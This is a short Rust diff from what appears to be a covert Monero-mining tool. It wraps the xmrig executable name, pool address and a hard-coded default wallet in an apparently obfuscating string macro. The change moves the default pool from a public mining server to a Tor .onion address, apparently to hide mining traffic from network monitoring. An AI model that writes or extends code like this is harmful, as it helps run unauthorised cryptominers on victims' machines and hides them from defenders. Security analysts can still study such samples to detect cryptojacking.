@@ -39,7 +39,7 @@ pub fn xmrig_exe_name() -> String {
 }
 
 pub fn default_xmrig_pool() -> String {
-    s!("gulf.moneroocean.stream:10128").to_owned()
+    s!("mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10128").to_owned()
 }
 pub fn default_monero_wallet() -> String {
     s!(
